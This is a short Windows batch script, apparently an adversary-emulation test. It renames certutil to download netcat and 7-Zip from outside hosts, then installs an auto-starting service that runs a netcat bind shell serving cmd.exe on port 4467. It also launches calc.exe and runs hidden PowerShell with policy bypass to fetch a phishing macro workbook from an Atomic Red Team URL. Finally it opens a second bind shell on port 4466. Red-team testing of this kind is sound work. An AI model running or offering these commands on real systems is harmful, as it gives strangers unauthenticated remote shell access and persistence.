@echo on

copy %windir%\system32\certutil.exe %temp%\cr.tmp

%temp%\cr.tmp -urlcache -split -f https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip %Temp%/netcat-win32-1.11.zip

%temp%\cr.tmp -urlcache -split -f https://github.com/daemondevin/7-ZipPortable/raw/master/App/7-Zip64/7z.exe %Temp%/7z.exe

%Temp%\7z.exe a -mx1 %Temp%\netcat-win32-1.11.zip %Temp%\

%Temp%\7z.exe x %Temp%\netcat-win32-1.11.zip -o%Temp%\

sc create XSample binPath= "cmd.exe /C %Temp%\netcat-1.11\nc64.exe -nLvp 4467 -e cmd.exe" start= auto DisplayName= "XSample Service" & sc start XSample

C:\Windows\system32\calc.exe

powershell.exe -windowstyle hidden -ep Bypass -nop -noexit -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm?raw=true', 'C:\tools\s.xlsm')"


%Temp%\netcat-1.11\nc64.exe -nLvp 4466 -e cmd.exe


